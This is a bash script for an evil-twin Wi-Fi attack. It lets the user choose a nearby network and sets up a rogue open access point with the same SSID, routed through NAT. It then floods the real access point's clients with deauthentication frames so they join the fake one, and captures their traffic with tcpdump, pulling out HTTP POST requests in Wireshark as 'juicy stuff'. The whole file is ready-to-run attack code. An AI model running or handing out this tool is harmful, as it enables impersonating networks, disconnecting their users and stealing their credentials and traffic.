#!/bin/bash
#We define here the interfaces that will be used
echo -e "[\e[0;33mi\e[0m] Please enter the name of the interface that will act as an access point:"
read listeningInterface
echo -e "[\e[0;33mi\e[0m] Please enter the name of the interface to monitor mode :"
read deauthInterface
echo -e "[\e[0;33mi\e[0m] Please enter the name of the interface that will be connected to internet :"
read internetInterface

#Our variables to stock the ESSID and BSSID of the tested network
finalESSID=""
finalBSSID=""
hostapdPID=""
dnsmasqPID=""

#We scan the near networks and select the one we want to test
echo -e "[\e[0;33mi\e[0m] Please select the target wifi"
select ESSID in $(iwlist ${deauthInterface} scan | grep ESSID)
do
        var=${ESSID#*:\"}
        finalESSID=${var%\"}
        break
done

#We clean the result to get the BSSID
BSSID=$(iwlist ${deauthInterface} scan | grep -B 5 $finalESSID | grep Address| head -1 )
finalBSSID=$(echo $BSSID | grep "([A-F0-9][A-F0-9]:){5}[A-F0-9][A-F0-9]" -Eo)

#We enable the ipv4 forwarding, the routing on our internet interface and disable ipv6 to avoid conflics
echo -e "[\e[0;33mi\e[0m] Setting up the ip-forward and the firewall..."
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -I POSTROUTING -t nat -o ${internetInterface} -j MASQUERADE
sudo sysctl -w net.ipv6.conf.all.disable_ipv6=1
echo -e "[\e[0;32mi\e[0m] Done!"

#All the options to make dnsmasq working
echo -e "[\e[0;33mi\e[0m] Setting up dnsmasq..."
echo "interface=${listeningInterface}" > dnsmasq.conf
echo "dhcp-range=192.168.1.10,192.168.1.100,12h" >> dnsmasq.conf
echo "dhcp-option=6,8.8.8.8" >> dnsmasq.conf
echo "dhcp-option=3,192.168.1.1" >> dnsmasq.conf
echo "server=8.8.8.8" >> dnsmasq.conf
echo "no-resolv" >> dnsmasq.conf

#We add the ip of our listening interface (router) and launch dnsmasq in background
sudo ip addr add 192.168.1.1/24 dev "${listeningInterface}"
sudo dnsmasq -d -C ./dnsmasq.conf& > /dev/null
echo "$!"
dnsmasqPID=$!

echo -e "[\e[0;32mi\e[0m] Done!"

#All the options to make hostapd working
echo -e "[\e[0;33mi\e[0m] Setting up hostapd..."
echo "interface=${listeningInterface}" > hostapd.conf
echo "ssid=${finalESSID}" >> hostapd.conf
echo "hw_mode=g" >> hostapd.conf
echo "channel=11" >> hostapd.conf

#We launch hostapd in background
sudo hostapd hostapd.conf&
echo "$!"
hostapdPID=$!
sleep 10
echo -e "[\e[0;32mi\e[0m] Done!"

#We launch the monitor mode of or second interface
echo -e "[\e[0;33mi\e[0m] Putting ${deauthInterface} in monitor mode..."
sudo airmon-ng start ${deauthInterface}
echo -e "[\e[0;32mi\e[0m] Done!"
#We can uncomment the next line if we are on a live machine
#deauthInterface$=$(ip a | grep "wl.*mon:" -o | cut -d: -f1)
echo -e "[\e[0;33mi\e[0m] Sending deauthentification frames..."
sudo aireplay-ng -0 50 -a ${finalBSSID} ${deauthInterface} -D

sleep 20
echo -e "[\e[0;32mi\e[0m] Done!"

#We stop the monitor mode of our second interface
echo -e "[\e[0;33mi\e[0m] Putting ${deauthInterface} back in managed mode..."
sudo airmon-ng stop ${deauthInterface}
echo -e "[\e[0;32mi\e[0m] Done!"

#We launch tcpdump and open Wireshark to see if we get some juicy stuff
echo -e "[\e[0;33mi\e[0m] Please enter the number of seconds to sniff :"
read tcpdumpTime
sudo timeout ${tcpdumpTime} tcpdump -i ${listeningInterface} -w sniff.txt
sudo wireshark -r sniff.txt -J "http.request.method == POST"
echo -e "[\e[0;33mi\e[0m] Do you want to stop the attack ? Y/N"
read stopAnsw
if [ $stopAnsw = "Y" ]
then
  kill ${hostapdPID} ${dnsmasqPID}
  echo -e "[\e[0;33mi\e[0m] Good bye !"
else
  echo -e "[\e[0;33mi\e[0m] Alright, let's continue !"
fi
